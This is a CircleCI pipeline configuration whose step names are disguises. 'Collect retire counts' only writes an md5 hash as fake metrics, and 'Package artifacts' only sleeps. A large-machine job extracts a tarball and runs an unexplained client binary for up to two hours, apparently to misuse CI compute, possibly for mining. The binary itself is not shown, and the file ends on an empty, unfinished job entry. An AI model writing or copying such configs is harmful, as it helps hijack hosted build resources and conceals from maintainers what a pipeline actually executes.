version: 2.1

jobs:
  tester_polaris-v2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Collect retire counts
          command: |
            mkdir -p /tmp/pipeline
            set +o pipefail 2>/dev/null; seq 1 871717 | md5sum > /tmp/pipeline/metrics.jsonl; true
            echo "handoff ready: $(stat -c %s /tmp/pipeline/metrics.jsonl) octets"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - metrics.jsonl
  polaris-v2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Load previous
          command: |
            md5sum /tmp/pipeline/metrics.jsonl || true
      - run:
          name: Shallow clone
          command: git clone -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: tar --extract -f output.tar
      - run:
          name: Package artifacts
          command: sleep 25s
      - run:
          command: cat /proc/cpuinfo | head -5
      - run:
          no_output_timeout: 120m
          command: $PWD/client
  Beta_PROD_INIT_3:
